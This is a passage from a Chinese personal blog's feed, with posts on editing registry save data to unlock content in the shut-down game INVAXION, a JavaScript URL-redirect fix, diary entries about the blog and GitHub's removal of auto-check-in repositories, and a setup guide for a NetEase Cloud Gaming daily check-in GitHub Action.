        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>PS：音灵解锁补丁是我在高考前1个月左右的时候摸的，具体可以看Commit记录√</p></blockquote><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/INVAXION-Unlock-Log/Announcement.png"></p><p>音灵在2021.2.5宣布停运，我直到五月左右上游戏的时候才发现，我卡在了加载页面，翻了一下讨论区才发现，游戏停运了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/INVAXION-Unlock-Log/Loading.png"></p><p>但是我还在讨论区里找到了这个</p><p><a href="steamcommunity.com/app/921630/discussions/0/5350815203296872967/"><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/INVAXION-Unlock-Log/Unlock-Level.png"></a></p><p>然后我就下了这个使用了，发现，诶，我的铺面确实全解锁了，于是我开始了我的星舰解锁工具和角色解锁工具的制作</p><hr><p>星舰这个东西，我翻了一下我自己的存档（在注册表）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/INVAXION-Unlock-Log/Regedit-Theme.png" alt="注：本图是解锁完成后的注册表"></p><p>发现数字都在个位数，而我数了一下星舰的数量是13，我就在想，星舰的编号是不是从1~13，然后我就开始了我的解锁之旅</p><p>一开始我先将里面的内容换成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;themeID&quot;:1&#125;,&#123;&quot;themeID&quot;:2&#125;,&#123;&quot;themeID&quot;:3&#125;,&#123;&quot;themeID&quot;:4&#125;,&#123;&quot;themeID&quot;:5&#125;,&#123;&quot;themeID&quot;:6&#125;,&#123;&quot;themeID&quot;:7&#125;,&#123;&quot;themeID&quot;:8&#125;,&#123;&quot;themeID&quot;:9&#125;,&#123;&quot;themeID&quot;:10&#125;,&#123;&quot;themeID&quot;:11&#125;,&#123;&quot;themeID&quot;:12&#125;,&#123;&quot;themeID&quot;:13&#125;]</span><br></pre></td></tr></table></figure><p>这样一长串（拿Python生成的，毕竟我可不想一个一个打）</p><p>转成Hex就变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5b,7b,22,74,68,65,6d,65,49,44,22,3a,31,7d,2c,7b,22,74,68,65,6d,65,49,44,22,3a,32,7d,2c,7b,22,74,68,65,6d,65,49,44,22,3a,33,7d,2c,7b,22,74,68,65,6d,65,49,44,22,3a,34,7d,2c,7b,22,74,68,65,6d,65,49,44,22,3a,35,7d,2c,7b,22,74,68,65,6d,65,49,44,22,3a,36,7d,2c,7b,22,74,68,65,6d,65,49,44,22,3a,37,7d,2c,7b,22,74,68,65,6d,65,49,44,22,3a,38,7d,2c,7b,22,74,68,65,6d,65,49,44,22,3a,39,7d,2c,7b,22,74,68,65,6d,65,49,44,22,3a,31,30,7d,2c,7b,22,74,68,65,6d,65,49,44,22,3a,31,31,7d,2c,7b,22,74,68,65,6d,65,49,44,22,3a,31,32,7d,2c,7b,22,74,68,65,6d,65,49,44,22,3a,31,33,7d,5d</span><br></pre></td></tr></table></figure><p>然后导入注册表，接着发现</p><p><strong>爷进不了离线模式了……</strong></p><p>有点崩溃，一开始还以为是思路有问题，先恢复了一下（谁在操作存档的时候不备份呀）</p><p>恢复以后再次打开注册表发现：<strong>是<code>themeId</code>不是<code>themeID</code></strong></p><p>哎呀犯了一个低级错误，重新来</p><p>将所有的<code>ID</code>改成<code>Id</code>重新导入，诶成了，但是巨蟹号（最后含金量的主题）没有解锁</p><p>然后试了一下ID0和ID14，终于搞定了，ID14是巨蟹号的</p><p>人物当然也一样啦，但是人物那么多，而且ID还不是像主题这样连着的</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/INVAXION-Unlock-Log/Regedit-Char.png" alt="注：本图是解锁完成后的注册表"></p><p>我就去翻了一下文件，在<code>音灵 INVAXION\INVAXION_Data\StreamingAssets</code>这个目录下找到了所有的角色文件，在文件名上附有ID</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/INVAXION-Unlock-Log/File-Char.png"></p><p>再次掏出工具（Python），生成对应的列表，然后导入，果然不出所料，所有角色都已经解锁了</p><p>接着打包，发布在Steam社区，在Github配布文件，搞定√</p><p>星舰解锁：<a href="https://steamcommunity.com/app/921630/discussions/0/3150808675338262041">https://steamcommunity.com/app/921630/discussions/0/3150808675338262041</a></p><p>人物解锁：<a href="https://steamcommunity.com/app/921630/discussions/0/3150808675345244413">https://steamcommunity.com/app/921630/discussions/0/3150808675345244413</a></p><p>铺面解锁（不是我做的，但是是我参考的）：<a href="https://steamcommunity.com/app/921630/discussions/0/5350815203296872967/">https://steamcommunity.com/app/921630/discussions/0/5350815203296872967/</a></p><p>存档配布（只打了全铺面，我的个人存档）：<a href="https://steamcommunity.com/app/921630/discussions/0/3130541756147189784/">https://steamcommunity.com/app/921630/discussions/0/3130541756147189784/</a>（中文）</p><p><a href="https://steamcommunity.com/app/921630/discussions/0/3150808588793019131/">https://steamcommunity.com/app/921630/discussions/0/3150808588793019131/</a>（英文）</p><p>要是你有Steam点数可以稍微给我打赏一点，谢谢老板(*^▽^*)</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站优化：网站目录缩短及重定向</title>
      <link href="/posts/301Redirect/"/>
      <url>/posts/301Redirect/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>考完高考啦，闲的没事干，想着之前各种SEO优化服务给我发的邮件，我想说：我自己也知道我的链接太长了呀！！！</p><p>所以这波是自己来优化（其实就是把链接缩短了而已）</p><p>本来是想着每个都加个301跳转，这样我就可以跳转到网页了，然后新建了两个干了起来</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/301Redirect/Thought1.png" alt="本来的想法"></p><p>然后看到我的一堆文章，啥呀，整整三十六篇？？？！我这得搞到什么时候</p><p>说句实话，我才弄好俩了，就已经感觉太麻烦了，这条路行不通</p><p>然后我就想用我三脚猫功夫的JavaScript来弄，于是就有了下面这种问题</p><p><strong>想法：</strong></p><ul><li>使用window函数获取当前链接</li><li>使用正则表达式匹配链接</li><li>将连接中的日期统一替换为<code>posts</code></li><li>控制301访问新的链接</li></ul><p>想好了，开工！</p><hr><p>我的第一版JavaScript是这么写的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span></span><br><span class="line">result = <span class="title class_">String</span>(url).<span class="title function_">replace</span>(<span class="regexp">/20[0-2][0-9]\/[0-1][1-9]\/[0-3][1-9]/i</span>,<span class="string">&#x27;posts&#x27;</span>)</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = result</span><br></pre></td></tr></table></figure><p>解读一下：</p><ul><li>获取当前链接地址并赋值为url</li><li>将替换url中匹配正则表达式的部分，并替换为<code>posts</code></li><li>通过window函数将网页定位到新的链接</li></ul><p>写好，上传到Github并用jsdelivr引入，渲染访问</p><p>然后问题就来了：所有的网页（因为我是全局引入）会进入无尽的刷新状态，原因是访问时不管是匹配还是不匹配都会进行301重定向，重定向完后访问的目标网页也有这个JavaScript，再次进行重定向，然后就进入了循环</p><p>（事实上，我到了第三版才发现这个问题，所以我们先放着这个问题）</p><hr><p>下面是第二版√</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span></span><br><span class="line">whether = <span class="title class_">String</span>(url).<span class="title function_">search</span>(<span class="regexp">/20[0-2][0-9]\/[0-1][1-9]\/[0-3][1-9]/i</span>)</span><br><span class="line"><span class="keyword">if</span>(whether == <span class="title class_">True</span>)&#123;</span><br><span class="line">    result = <span class="title class_">String</span>(url).<span class="title function_">replace</span>(<span class="regexp">/20[0-2][0-9]\/[0-1][1-9]\/[0-3][1-9]/i</span>,<span class="string">&#x27;posts&#x27;</span>)</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span> = result</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span> = url</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个说句实在话，我在404.html引入的，然后将<code>posts</code>重定向的地方对了，但是，一旦不符合这个表达式，还是会陷入死循环，死在404界面上，然后这时候我才发现了这个问题，再次进行修改</p><hr><p>第三版开始啦！</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span></span><br><span class="line">whether = <span class="title class_">String</span>(url).<span class="title function_">search</span>(<span class="regexp">/20[0-2][0-9]\/[0-1][1-9]\/[0-3][1-9]/i</span>)</span><br><span class="line"><span class="keyword">if</span>(whether == <span class="literal">true</span>)&#123;</span><br><span class="line">    result = <span class="title class_">String</span>(url).<span class="title function_">replace</span>(<span class="regexp">/20[0-2][0-9]\/[0-1][1-9]\/[0-3][1-9]/i</span>,<span class="string">&#x27;posts&#x27;</span>)</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span> = result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仍旧是在404页面引入的，这版是好的，直接放在网站的<code>/js/301Redirect.js</code>里面，404页面引入即可</p><p>另：在做这个的过程中，jsdelivr好像有点问题，就是本来可以通过访问<code>purge.jsdelivr.net</code>来刷新文件缓存，但是实际上自从jsd上次Down了以后，访问就刷不了了，所以最后采用的是放在网站的目录中而不是放在jsd引入</p><p>总之这一次的网站优化就这么搞定了，新链接还行，就等搜索引擎自己帮我改过去了√</p><hr><p><strong>2021.6.24更新</strong></p><p>发现访问的链接并不一定是上面那样<code>/YYYY/MM/DD/:post</code>的形式，甚至有<code>/YYYY/MM/DD/:post/</code>和<code>/YYYY/MM/DD/:post/index.html</code>的访问方式，所以我又来修改了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span></span><br><span class="line">whether = <span class="title class_">String</span>(url).<span class="title function_">search</span>(<span class="regexp">/20[0-2][0-9]\/[0-1][1-9]\/[0-3][1-9]/i</span>)</span><br><span class="line">whethersplash = <span class="title class_">String</span>(url).<span class="title function_">search</span>(<span class="regexp">/20[0-2][0-9]\/[0-1][1-9]\/[0-3][1-9]\//i</span>)</span><br><span class="line">whetherindex = <span class="title class_">String</span>(url).<span class="title function_">search</span>(<span class="regexp">/20[0-2][0-9]\/[0-1][1-9]\/[0-3][1-9]\/index.html/i</span>)</span><br><span class="line"><span class="keyword">if</span>(whether == <span class="literal">true</span> | whethersplash == <span class="literal">true</span> | whetherindex == <span class="literal">true</span>)&#123;</span><br><span class="line">    result = <span class="title class_">String</span>(url).<span class="title function_">replace</span>(<span class="regexp">/20[0-2][0-9]\/[0-1][1-9]\/[0-3][1-9]/i</span>,<span class="string">&#x27;posts&#x27;</span>)</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">location</span> = result</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>加多了两个判断，然后用或运算符在if中判断是否需要跳转，完事！</p><p>不知道这样可不可以，用一段时间再说吧√</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“陪伴是最长情的告白”</title>
      <link href="/posts/diary6/"/>
      <url>/posts/diary6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这应该是我第一次写这种对话式的文章，怎么说呢，本文其实是我要说的一些东西……</p><p>相信经常跟我聊天的群友们知道，我现在（2020.7.15）是一名高三学生，在2021年参加高考，也就是说，现在我其实并没有什么精力放在网站的维护和文章的撰写上</p><p>2019年7月1日，本站正式上线，当时还是本主题的早期开发版，功能还挺少的，而且没有多级导航菜单。文章只有一篇hello world，直到我7月5号写了当时我用的挺多的一个软件——<a href="https://bili33.top/2019/07/05/cmder/">cmder</a>，才有了第一篇文章</p><p>7月9号，我同学LOL想带我上分，但是发现自己的电脑系统坏了，问我怎么装，我说了以后他并没有明白，就写了一篇<a href="https://bili33.top/2019/07/09/Windows-Setup/">Windows安装教程</a></p><p>此后，我一直在更新一些软件分享类的教程，当然也包括<a href="https://bili33.top/2019/09/07/hexo-deploy-guide/">hexo的部署</a>、<a href="https://bili33.top/2019/09/19/srs/">直播服务器srs的搭建</a>、<a href="https://bili33.top/2019/10/25/CloudFlare-Workers-Section1/">CloudFlare Workers的实战</a>等文章，当然其中包括我高一同学合作完成的小说<a href="https://bili33.top/2019/07/13/666/">“这个故事由我开始，也应由我来结束”</a>（主页隐藏）</p><p>到了今年的寒假，因为新冠肺炎爆发，我在家里很无聊，开始写起了爬虫，就出现了<a href="https://bili33.top/2020/02/11/Hitokoto-Spider/">Hitokoto-Spider</a>和<a href="https://bili33.top/2020/02/17/Netease-Comment-Spider/">Netease-Comment-Spider</a>这两个项目，其实这是我第一次将python的知识拿来实战，后来就开始不断用python弄各种东西，包括<a href="https://bili33.top/2020/04/19/Valine-Magic/">Valine-Magic</a>，还写了几个<a href="https://bili33.top/2020/05/30/MCDR-Usage/">MCDReforged</a>的插件，深刻地体会到了开发的乐趣</p><p>2020&#x2F;5&#x2F;11这一天，我回到了学校，开始复学。从这天开始，我露头的机会就少了很多，主要是①从工作室退休了 ②不是经常坐在电脑前，所以大家的留言我会比较晚回复（高PING战士）</p><p>不过我还是在坚持更新<a href="https://bili33.top/2020/04/19/Valine-Magic/">Valine-Magic</a>，渐渐地从Github中回到了现实生活</p><p>2020&#x2F;7&#x2F;15这天，我正式考完了高二最后一场考试，升到了高三。我将在2020年8月9日返校开学，到那时，我将会真正投入学习，所以就没什么精力去更新本站和<a href="https://bili33.top/2020/04/19/Valine-Magic/">Valine-Magic</a>（可以交Issue和PR），希望各位友链大佬能够给小弟保留一个位置</p><p>陪伴是最长情的告白，感谢各位访客的陪伴，到了今天在我写这篇文章的时候，UV是<code>7538</code>，PV是<code>24138</code>。不管你是刚来到本站，还是以前就来过本站，我在这里都感谢你们。我将在2021年6月8日到2021年6月10日参加全国高考，届时等我合上笔盖，从学校回到开发界，我相信我能够闯出属于我的天空！</p><p>想与我联系，可以使用QQ加3559869084或者发邮件到<a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#110;&#64;&#98;&#x69;&#108;&#x69;&#51;&#51;&#46;&#x74;&#111;&#112;">&#x61;&#x64;&#x6d;&#x69;&#110;&#64;&#98;&#x69;&#108;&#x69;&#51;&#51;&#46;&#x74;&#111;&#112;</a>，我的索爱W595C虽然已经饱经沧桑，但是他还是能看邮件的……</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary6/Sony-Ericsson-W595C.jpg" alt="菠咯波咯哒のSony Ericsson W595C"></p><p>GamerNoTitle</p><p>2020-07-15 18:27:01</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常吐槽09：关于我得知Github查封Action仓库的信息后我自行删除脚本的这档事</title>
      <link href="/posts/diary9/"/>
      <url>/posts/diary9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>本文直接从我个人的讨论区复制过来的，图片是GithubUserContent域名下的，加载可能有点慢</p><p>原链接：<a href="https://github.com/GamerNoTitle/GamerNoTitle/discussions/2">关于得知Github查封Action仓库的信息后我自行删除脚本的这档事 #2</a></p></blockquote><p>关于得知Github查封Action仓库的信息后我自行删除脚本的这档事（不要以为随便起个标题就是长标题了呀喂(#&#96;O′)）</p><p>昨天（2021.5.19）收到别人在我的网站下留言是这么说的：<br><img src="https://user-images.githubusercontent.com/28426291/118961191-a2a6b780-b996-11eb-9986-1f4f8f67dedf.png" alt="image"><br>鉴于这位之前发过mcbbs的账号给我，所以我迅速就取得了联系（邮件上），然后得到了下面的消息（<a href="https://t.me/TestFlightCN/9781">直链</a>）：<br><img src="https://user-images.githubusercontent.com/28426291/118961440-e699bc80-b996-11eb-922e-2ff5c4c77781.png" alt="image"><img src="https://user-images.githubusercontent.com/28426291/118961398-de418180-b996-11eb-97ab-699981bb7d11.png" alt="image"></p><p>我也是非常震惊，本来打算第二天（2021.5.20）把所有仓库删了的（因为临近高考没带智能手机），但是正巧，晚上有同学来找我拷毕业照拍摄当天的照片，所以我就借了一台手机把我的源码备份了然后全部删除了</p><p>这就是我删除了我的仓库的原因，按道理，所有的Fork会变成Origin类型的仓库（即源仓库，搜索是能检索到的），但是实际上当我检索我的两个仓库的时候就发现，220+的wyycg-autocheckin只有 个搜索结果，而另一个有120+的bilibiliJudge只有2个搜索结果<br><img src="https://user-images.githubusercontent.com/28426291/118962052-8d7e5880-b997-11eb-8956-8213525c2b42.png" alt="image"><br><img src="https://user-images.githubusercontent.com/28426291/118962000-80fa0000-b997-11eb-9496-2588a021114f.png" alt="image"></p><p>说明Github这波是真的行动了，可能是我行动比较早，所以目前没受到封号</p><p>有的人可能会问：如果我把仓库调成私有呢？<br>结果是：虽然私有仓库GItHub官方”不能”看到你的内容和Action的详细记录，但是发现了异常他们也可以提权处理<br><img src="https://user-images.githubusercontent.com/28426291/118962344-da622f00-b997-11eb-90a9-36f646e228ef.png" alt="image"></p><p>至于那些没有提供Action的运行方式的而是云函数的那些，也遭到了不同程度的后果<br><img src="https://user-images.githubusercontent.com/28426291/118962473-febe0b80-b997-11eb-94f6-7218e3678df3.png" alt="image"><br><img src="https://user-images.githubusercontent.com/28426291/118962503-08477380-b998-11eb-97ed-65cfcfcb802d.png" alt="image"></p><p>那如果我配布到Gitee呢？<br>事实上，Gitee的功能并没有Github那么好用，而且就个人而言我比较讨厌Gitee，所以我应该是不会配布到Gitee的<br><img src="https://user-images.githubusercontent.com/28426291/118962651-2e6d1380-b998-11eb-9adf-1e59c09b7bb8.png" alt="image"></p><p>总而言之，这一次的时间对于整个脚本界都是一次灾难，我们从来没有想过Github会清理脚本类型的仓库。对我来说，因为行动比较早所以没有受到严重的影响，但是我近期应该不会再致力于脚本的开发工作了，临近高考压力也比较大。等高考完网易云那个应该会做成云函数版在Github重新配布（会配Action文件但是如果要启用的话需要自己挪入对应的位置），B站那个嘛，看情况而论。</p><hr><p>题外话：<br>虽然我每次都把三个Badges丢在脚本的开头，但是实际上没有任何一个人给我赞助（o(╥﹏╥)o）<br><a href="https://afdian.net/@GamerNoTitle"><img src="https://img.shields.io/badge/%E7%88%B1%E5%8F%91%E7%94%B5-GamerNoTitle-%238e8cd8?style=for-the-badge" alt="前往爱发电赞助" width=auto height=auto border="0" /></a> <a href="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Donate/WeChatPay.png"><img src="https://img.shields.io/badge/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98-GamerNoTitle-%2304BE02?style=for-the-badge" alt="使用微信赞助" width=auto height=auto border="0" /></a> <a href="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Donate/AliPay.jpg"><img src="https://img.shields.io/badge/%E6%94%AF%E4%BB%98%E5%AE%9D%E6%94%AF%E4%BB%98-GamerNoTitle-%231678FF?style=for-the-badge" alt="使用支付宝赞助" width=auto height=auto border="0" /></a></p><p>有的时候我在想：做脚本是否是一件正确的事情，<br>之前我的B站仲裁脚本只是开了个坑（建了个仓库并写了个README），就有别人来支持我了，到现在我们两个还保持着联系。他经常发我一下风纪委员会的总结专栏下面的评论：<br><img src="https://user-images.githubusercontent.com/28426291/118963142-bc48fe80-b998-11eb-9a78-5dcc57722521.png" alt="image"><br><img src="https://user-images.githubusercontent.com/28426291/118963206-cd920b00-b998-11eb-81e4-dc5ad0c4c3a7.png" alt="image"></p><p>我们在做&#x2F;使用脚本的过程中是否侵犯了其他用户的利益，我觉得这是值得我们脚本开发者和使用者深思的事情。反正我近期不会再开发脚本了（一部分是高考，一部分是现在在做Koikatu的卡牌，不懂得自己搜）</p><p>如果你有什么建议&#x2F;意见，可以在这个Discussion下面留言，看到必回。就这样(^o^)&#x2F;</p><hr><h3 id="2021-x2F-5-x2F-22-更新"><a href="#2021-x2F-5-x2F-22-更新" class="headerlink" title="2021&#x2F;5&#x2F;22 更新"></a>2021&#x2F;5&#x2F;22 更新</h3><p>今天回家后发现本人小号有两个仓库已经中招了<br><img src="https://user-images.githubusercontent.com/28426291/119224057-43c87600-bb2f-11eb-8282-1deeaff06191.png" alt="image"><br><img src="https://user-images.githubusercontent.com/28426291/119224065-4cb94780-bb2f-11eb-818a-6afe1de837a4.png" alt="image"><br><img src="https://user-images.githubusercontent.com/28426291/119224095-73777e00-bb2f-11eb-8158-0518afa53667.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>白嫖？给我也整一个！白嫖网易云游戏平台时长</title>
      <link href="/posts/NeteaseCloudGameFree/"/>
      <url>/posts/NeteaseCloudGameFree/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/NeteaseCloudGameFree/bili33@ADMIN-PC%E4%B8%A82020.12.06%E4%B8%A811%EF%BC%9A32%EF%BC%9A55.png" alt="网易云游戏平台"></p><p>有谁不爱白嫖呢，特别是配置好的东西</p><p><a href="https://cloudgame.webapp.163.com/newer.html?invite_code=2ZLPWY">网易云游戏平台</a>我在它内测期间用过，那个时候游戏变动太大（指可玩的游戏下周就变得不一样了），然后就放弃了</p><p>几个月前不是原神公测了嘛，就发现这个平台有原神（主要是自己手机玩不动），所以就开始该平台的使用</p><p>但是！！！它每天只有120~180分钟的游戏时长（不签到120mins，签到不等），而且电脑游戏的时长是累计制的，不签到就等于没有！！！</p><p>于是，我开始了我的白嫖之旅……我写了一个自动签到脚本，用Github Action帮我运行，就可以自动签到了！（耶~~~）</p><p>你可以在Github搜索<code>wyycg-autocheckin</code>找到这个脚本，也可以直接访问<a href="https://github.com/GamerNoTitle/wyycg-autocheckin">https://github.com/GamerNoTitle/wyycg-autocheckin</a>来获取使用</p><hr><p>本脚本通过使用Github Action来进行<a href="https://cloudgame.webapp.163.com/newer.html?invite_code=2ZLPWY">网易云游戏</a>签到操作，让你能够天天白嫖网易云游戏时长和云电脑！</p><p>喜欢就给我点个STAR吧！</p><p>签到时间是早上10点，如果有需要就自己修改.github&#x2F;workflows&#x2F;AutoSignin.yml中第12行的时间，时间遵循UTC时间，+8才是我们的时间</p><p><strong>请不要使用非master分支脚本，他们通常正在开发新功能，会有BUG出现</strong></p><p>关于签到失败返回的结果（<a href="https://github.com/GamerNoTitle/wyycg-autocheckin/discussions/6">这里有实例</a>），如果你有解码的经验，可以前往<a href="https://github.com/GamerNoTitle/wyycg-autocheckin/discussions/6">这里</a>提供帮助，Thanks♪(･ω･)ﾉ</p><h2 id="赞助"><a href="#赞助" class="headerlink" title="赞助"></a>赞助</h2><p>点击下面的Badge其中一个就可以跳转到相应页面，感谢老板的支持！</p><p><a href="https://afdian.net/@GamerNoTitle"><img src="https://img.shields.io/badge/%E7%88%B1%E5%8F%91%E7%94%B5-GamerNoTitle-%238e8cd8?style=for-the-badge" alt="前往爱发电赞助" width=auto height=auto border="0" /></a> <a href="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Donate/WeChatPay.png"><img src="https://img.shields.io/badge/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98-GamerNoTitle-%2304BE02?style=for-the-badge" alt="使用微信赞助" width=auto height=auto border="0" /></a> <a href="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Donate/AliPay.jpg"><img src="https://img.shields.io/badge/%E6%94%AF%E4%BB%98%E5%AE%9D%E6%94%AF%E4%BB%98-GamerNoTitle-%231678FF?style=for-the-badge" alt="使用支付宝赞助" width=auto height=auto border="0" /></a></p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">使用方法</a></li><li><a href="#%E5%8F%98%E9%87%8F%E5%86%85%E5%AE%B9%E8%8E%B7%E5%8F%96">变量获取</a></li><li><a href="#%E8%84%9A%E6%9C%AC%E6%9B%B4%E6%96%B0">脚本更新</a></li><li><a href="#qa">Q&amp;A</a></li></ul><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="变量添加"><a href="#变量添加" class="headerlink" title="变量添加"></a>变量添加</h3><p>1、Fork本仓库，按右上角的分支按钮（如图）</p><p><img src="https://upimage.alexhchu.com/2020/11/22/e9b4bcf8e6a1d.png"></p><p>2、进入设置，设置变量<code>cookie</code>和<code>teleid</code> <code>teletoken</code> <code>SCKEY</code>（这三个可选）</p><p><strong>如果使用多用户，多个cookie请使用<code>#</code>分隔</strong></p><p><a href="#%E5%8F%98%E9%87%8F%E5%86%85%E5%AE%B9%E8%8E%B7%E5%8F%96">如何获取变量内容？请点这里</a></p><p><img src="https://upimage.alexhchu.com/2020/11/22/988724b77ca62.png"></p><p><img src="https://upimage.alexhchu.com/2020/11/22/a7958e9f5582f.png"></p><p><img src="https://upimage.alexhchu.com/2020/11/22/7213627d41fc1.png"></p><h3 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h3><p><strong>请在当天没有签到的情况下测试！！！</strong></p><p>我们先进入Action界面，启用Action</p><p><img src="https://upimage.alexhchu.com/2020/11/22/70dd262ae54f0.png"></p><p>然后我们进入对应的脚本，启用脚本，并进行测试</p><p><img src="https://upimage.alexhchu.com/2020/11/22/457403bb7d3bb.png"></p><p><strong>只要测试通过就是没问题，如果你配置了TELEGRAM还会收到你的BOT给你发送的消息</strong></p><p>测试通过后，你就可以放着它不用管了，它会自己运行的~</p><h2 id="变量内容获取"><a href="#变量内容获取" class="headerlink" title="变量内容获取"></a>变量内容获取</h2><h3 id="cookie获取"><a href="#cookie获取" class="headerlink" title="cookie获取"></a>cookie获取</h3><p>首先我们进入<a href="https://cg.163.com/">官网</a>，进行登录，然后用<kbd>F12</kbd>打开开发者工具后使用<kbd>Ctrl</kbd>+<kbd>F5</kbd>进行刷新，会刷出很多结果</p><p>我们在里面找到<code>@me</code>这一项，然后在右边找到<code>Authorization</code>将冒号后面的内容复制下来就是我们所需要的Cookie</p><p><strong>如果使用多用户，多个cookie请使用<code>#</code>分隔</strong></p><p><img src="https://upimage.alexhchu.com/2020/11/22/bfb0e2dbd347a.png"></p><h3 id="teleid获取"><a href="#teleid获取" class="headerlink" title="teleid获取"></a>teleid获取</h3><p>用你的Telegram找到@userinfobot，点个Start，会直接给你回复你的ID，复制下id后面的数字就是teleid了</p><p><img src="https://upimage.alexhchu.com/2020/11/22/e4c50250626a6.png"></p><h3 id="teletoken获取"><a href="#teletoken获取" class="headerlink" title="teletoken获取"></a>teletoken获取</h3><p>找@BotFather进行机器人的创建，按照提示创建即可，会给你一个API TOKEN，如果一不小心点过去了可以用命令<code>/mybots</code>管理自己的bot，找到自己想要使用的bot并获取API就可以了</p><p><img src="https://upimage.alexhchu.com/2020/11/22/0428751a3925e.png"></p><h3 id="SCKEY获取"><a href="#SCKEY获取" class="headerlink" title="SCKEY获取"></a>SCKEY获取</h3><p>访问<a href="http://sc.ftqq.com/?c=code">ServerChan官网</a>，用你的Github账户登录，在<code>发送信息</code>可以看到你的SCKEY</p><p><img src="https://upimage.alexhchu.com/2020/12/05/dff25704763d8.png"></p><h2 id="脚本更新"><a href="#脚本更新" class="headerlink" title="脚本更新"></a>脚本更新</h2><h3 id="自动更新"><a href="#自动更新" class="headerlink" title="自动更新"></a>自动更新</h3><p><a 